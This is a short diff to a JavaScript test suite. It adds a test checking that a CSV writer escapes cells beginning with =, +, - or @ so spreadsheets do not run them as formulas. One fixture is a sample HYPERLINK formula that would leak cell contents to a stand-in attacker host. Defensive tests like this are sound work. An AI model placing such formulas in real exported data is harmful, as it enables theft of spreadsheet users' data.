@@ -57,6 +57,14 @@ describe('toCsv', () => {
     expect(parseCsv(toCsv(rows))).toEqual(rows);
   });
 
+  it('keeps words a spreadsheet would run as a formula as words, and reads them back as they were (S-M1)', () => {
+    expect(toCsv([['en', 'ar'], ['=HYPERLINK("https://evil.example/?d="&A3,"Open")', '+1+cmd'], ['@SUM(1)', '-2']])).toBe(
+      `en,ar\r\n"'=HYPERLINK(""https://evil.example/?d=""&A3,""Open"")",'+1+cmd\r\n'@SUM(1),'-2\r\n`
+    );
+    const rows = [['=total', "'=kept"], ['@mona', '+20 100']];
+    expect(parseCsv(toCsv(rows))).toEqual(rows);
+  });
+
   it('quotes tabs and semicolons, so a first row full of them is not read as split by them', () => {
     for (const rows of [[['a\tb\tc', 'd'], ['e', 'f']], [['a;b;c', 'd'], ['e', 'f']]]) expect(parseCsv(toCsv(rows))).toEqual(rows);
   });
